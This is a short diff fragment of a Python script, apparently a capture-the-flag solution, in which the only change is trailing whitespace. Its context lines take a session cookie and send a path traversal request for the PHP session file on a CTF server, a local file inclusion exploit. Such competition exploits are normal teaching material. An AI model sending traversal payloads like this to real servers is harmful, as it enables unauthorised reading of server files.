@@ -9,4 +9,4 @@ session = res.headers['Set-Cookie'].split('=')[1].split(';')[0]
 res = requests.get('https://edu-ctf.csie.org:10157/?action=module&m=../../../../../../../../var/lib/php/session/sess_{}'.format(session),
                     verify = False    
 )
-print (res.text)
+print (res.text) 
